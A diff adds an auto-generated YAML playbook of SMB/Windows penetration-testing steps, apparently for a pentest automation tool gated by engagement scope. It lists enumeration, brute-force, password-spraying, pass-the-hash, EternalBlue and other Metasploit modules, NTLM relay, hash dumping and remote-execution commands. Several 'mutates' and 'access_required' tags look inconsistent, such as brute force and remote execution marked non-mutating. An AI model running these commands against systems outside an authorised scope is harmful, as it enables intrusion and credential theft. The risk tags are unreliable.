@@ -1,0 +1,318 @@
+# GENERATED from smb_methodology.md by scripts/playbooks_to_yaml.py — do not hand-edit.
+#
+# The markdown stays authoritative: it is what a human reads and what RAG
+# ingests. This is an EXTRACT of the steps in it, so that something other
+# than a language model can act on them. Re-generate after editing the
+# markdown; tests/test_playbooks.py fails if the two drift.
+#
+# access_required is a conservative heuristic, recorded so a consumer can
+# FILTER — never so anything can decide to run. Authorisation stays with
+# the scope gate and the engagement's approval.
+name: smb_methodology
+title: SMB/Windows Penetration Testing Methodology
+source: smb_methodology.md
+generated_by: scripts/playbooks_to_yaml.py
+phases:
+- id: initial-reconnaissance
+  name: Initial Reconnaissance
+  steps:
+  - id: initial-reconnaissance.port-scanning
+    title: Port Scanning
+    access_required: none
+    mutates: false
+    source_line: 8
+    commands:
+    - lang: bash
+      command: nmap -sV -sC -p139,445 --script=smb-* {target}
+    - lang: bash
+      command: nmap -p445 --script=smb-vuln-* {target}
+  - id: initial-reconnaissance.smb-version-detection
+    title: SMB Version Detection
+    access_required: none
+    mutates: false
+    source_line: 17
+    commands:
+    - lang: bash
+      command: nmap -p445 --script smb-protocols {target}
+    - lang: bash
+      command: smbclient -L //{target}/ -N
+- id: enumeration
+  name: Enumeration
+  steps:
+  - id: enumeration.share-enumeration
+    title: Share Enumeration
+    access_required: credential
+    mutates: false
+    source_line: 28
+    commands:
+    - lang: bash
+      command: smbclient -L //{target}/ -N
+    - lang: bash
+      command: smbclient -L //{target}/ -U username%password
+    - lang: bash
+      command: smbmap -H {target}
+    - lang: bash
+      command: smbmap -H {target} -u '' -p ''
+    - lang: bash
+      command: smbmap -H {target} -u 'guest' -p ''
+    - lang: bash
+      command: smbmap -H {target} -u username -p password
+    - lang: bash
+      command: crackmapexec smb {target} -u '' -p '' --shares
+    - lang: bash
+      command: crackmapexec smb {target} -u 'guest' -p '' --shares
+    - lang: bash
+      command: impacket-smbclient -no-pass {target}
+  - id: enumeration.comprehensive-enumeration
+    title: Comprehensive Enumeration
+    access_required: none
+    mutates: false
+    source_line: 48
+    commands:
+    - lang: bash
+      command: enum4linux -a {target}
+    - lang: bash
+      command: enum4linux-ng -A {target}
+  - id: enumeration.user-enumeration
+    title: User Enumeration
+    access_required: credential
+    mutates: true
+    source_line: 57
+    commands:
+    - lang: bash
+      command: crackmapexec smb {target} -u '' -p '' --users
+    - lang: bash
+      command: crackmapexec smb {target} -u '' -p '' --rid-brute
+    - lang: bash
+      command: rpcclient -U '' -N {target}
+    - lang: bash
+      command: rpcclient> enumdomusers
+    - lang: bash
+      command: rpcclient> enumdomgroups
+    - lang: bash
+      command: rpcclient> queryuser 500
+  - id: enumeration.password-policy
+    title: Password Policy
+    access_required: credential
+    mutates: true
+    source_line: 70
+    commands:
+    - lang: bash
+      command: crackmapexec smb {target} -u '' -p '' --pass-pol
+    - lang: bash
+      command: rpcclient -U '' -N {target}
+    - lang: bash
+      command: rpcclient> getdompwinfo
+- id: authentication-attacks
+  name: Authentication Attacks
+  steps:
+  - id: authentication-attacks.null-session
+    title: Null Session
+    access_required: credential
+    mutates: false
+    source_line: 82
+    commands:
+    - lang: bash
+      command: smbclient //{target}/IPC$ -N
+    - lang: bash
+      command: rpcclient -U '' -N {target}
+    - lang: bash
+      command: crackmapexec smb {target} -u '' -p ''
+  - id: authentication-attacks.guest-account
+    title: Guest Account
+    access_required: credential
+    mutates: false
+    source_line: 94
+    commands:
+    - lang: bash
+      command: smbclient -L //{target}/ -U 'guest'%''
+    - lang: bash
+      command: crackmapexec smb {target} -u 'guest' -p ''
+  - id: authentication-attacks.brute-force
+    title: Brute Force
+    access_required: credential
+    mutates: false
+    source_line: 100
+    commands:
+    - lang: bash
+      command: hydra -L users.txt -P passwords.txt smb://{target}
+    - lang: bash
+      command: crackmapexec smb {target} -u users.txt -p passwords.txt
+    - lang: bash
+      command: medusa -h {target} -U users.txt -P passwords.txt -M smbnt
+  - id: authentication-attacks.password-spraying
+    title: Password Spraying
+    access_required: credential
+    mutates: false
+    source_line: 112
+    commands:
+    - lang: bash
+      command: crackmapexec smb {target} -u users.txt -p 'Password123!' --continue-on-success
+    - lang: bash
+      command: crackmapexec smb {target} -u users.txt -p 'Summer2024!' --continue-on-success
+  - id: authentication-attacks.pass-the-hash
+    title: Pass-the-Hash
+    access_required: credential
+    mutates: false
+    source_line: 119
+    commands:
+    - lang: bash
+      command: crackmapexec smb {target} -u username -H NTHASH
+    - lang: bash
+      command: impacket-smbclient -hashes :NTHASH domain/user@{target}
+    - lang: bash
+      command: impacket-psexec -hashes :NTHASH domain/user@{target}
+    - lang: bash
+      command: impacket-wmiexec -hashes :NTHASH domain/user@{target}
+    - lang: bash
+      command: evil-winrm -i {target} -u username -H NTHASH
+- id: vulnerability-exploitation
+  name: Vulnerability Exploitation
+  steps:
+  - id: vulnerability-exploitation.ms17-010-eternalblue
+    title: MS17-010 (EternalBlue)
+    access_required: none
+    mutates: false
+    source_line: 135
+    commands:
+    - lang: bash
+      command: nmap -p445 --script smb-vuln-ms17-010 {target}
+    - lang: bash
+      command: use exploit/windows/smb/ms17_010_eternalblue
+    - lang: bash
+      command: set RHOSTS {target}
+    - lang: bash
+      command: exploit
+  - id: vulnerability-exploitation.ms08-067-netapi
+    title: MS08-067 (NetAPI)
+    access_required: none
+    mutates: false
+    source_line: 146
+    commands:
+    - lang: bash
+      command: nmap -p445 --script smb-vuln-ms08-067 {target}
+    - lang: bash
+      command: use exploit/windows/smb/ms08_067_netapi
+    - lang: bash
+      command: set RHOSTS {target}
+    - lang: bash
+      command: exploit
+  - id: vulnerability-exploitation.cve-2017-7494-sambacry
+    title: CVE-2017-7494 (SambaCry)
+    access_required: none
+    mutates: false
+    source_line: 157
+    commands:
+    - lang: bash
+      command: nmap -p445 --script smb-vuln-cve-2017-7494 {target}
+    - lang: bash
+      command: use exploit/linux/samba/is_known_pipename
+    - lang: bash
+      command: set RHOSTS {target}
+    - lang: bash
+      command: exploit
+  - id: vulnerability-exploitation.smb-signing-disabled
+    title: SMB Signing Disabled
+    access_required: none
+    mutates: false
+    source_line: 168
+    commands:
+    - lang: bash
+      command: nmap -p445 --script smb-security-mode {target}
+- id: share-access
+  name: Share Access
+  steps:
+  - id: share-access.connecting-to-shares
+    title: Connecting to Shares
+    access_required: credential
+    mutates: false
+    source_line: 178
+    commands:
+    - lang: bash
+      command: smbclient //{target}/ShareName -U username%password
+    - lang: bash
+      command: 'smbclient //{target}/ShareName -N  # null session'
+    - lang: bash
+      command: mount -t cifs //{target}/ShareName /mnt/share -o username=user,password=pass
+  - id: share-access.common-shares-to-check
+    title: Common Shares to Check
+    access_required: none
+    mutates: false
+    source_line: 188
+    checks:
+    - '`C$` - Admin share (admin access)'
+    - '`ADMIN$` - Admin share (admin access)'
+    - '`IPC$` - Inter-process communication'
+    - '`SYSVOL` - Domain policies (domain joined)'
+    - '`NETLOGON` - Logon scripts (domain joined)'
+  - id: share-access.interesting-files
+    title: Interesting Files
+    access_required: credential
+    mutates: false
+    source_line: 195
+    commands:
+    - lang: bash
+      command: smbmap -H {target} -u user -p pass -R ShareName --depth 5
+    - lang: bash
+      command: smbclient //{target}/ShareName -U user%pass -c 'recurse; prompt; mget *'
+    checks:
+    - Configuration files (web.config, *.ini, *.conf)
+    - Scripts (*.ps1, *.vbs, *.bat)
+    - Office documents (may contain macros or credentials)
+    - Database files (*.mdb, *.accdb, *.db)
+    - Password files (passwords.txt, creds.txt)
+    - Private keys (*.key, *.pem, id_rsa)
+- id: relay-attacks
+  name: Relay Attacks
+  steps:
+  - id: relay-attacks.smb-relay-requires-smb-signing-disabled
+    title: SMB Relay (Requires SMB Signing Disabled)
+    access_required: none
+    mutates: false
+    source_line: 237
+    commands:
+    - lang: bash
+      command: crackmapexec smb {network}/24 --gen-relay-list targets.txt
+    - lang: bash
+      command: impacket-ntlmrelayx -tf targets.txt -smb2support
+  - id: relay-attacks.responder
+    title: Responder
+    access_required: none
+    mutates: false
+    source_line: 248
+    commands:
+    - lang: bash
+      command: responder -I eth0 -wrf
+- id: post-exploitation
+  name: Post-Exploitation
+  steps:
+  - id: post-exploitation.extract-hashes
+    title: Extract Hashes
+    access_required: shell
+    mutates: false
+    source_line: 258
+    commands:
+    - lang: bash
+      command: impacket-secretsdump domain/admin:password@{target}
+    - lang: bash
+      command: impacket-secretsdump -hashes :NTHASH domain/admin@{target}
+    - lang: bash
+      command: reg save HKLM\SAM sam
+    - lang: bash
+      command: reg save HKLM\SYSTEM system
+    - lang: bash
+      command: impacket-secretsdump -sam sam -system system LOCAL
+  - id: post-exploitation.remote-execution
+    title: Remote Execution
+    access_required: shell
+    mutates: false
+    source_line: 270
+    commands:
+    - lang: bash
+      command: impacket-psexec domain/user:password@{target}
+    - lang: bash
+      command: impacket-wmiexec domain/user:password@{target}
+    - lang: bash
+      command: impacket-smbexec domain/user:password@{target}
+    - lang: bash
+      command: impacket-atexec domain/user:password@{target} "command"
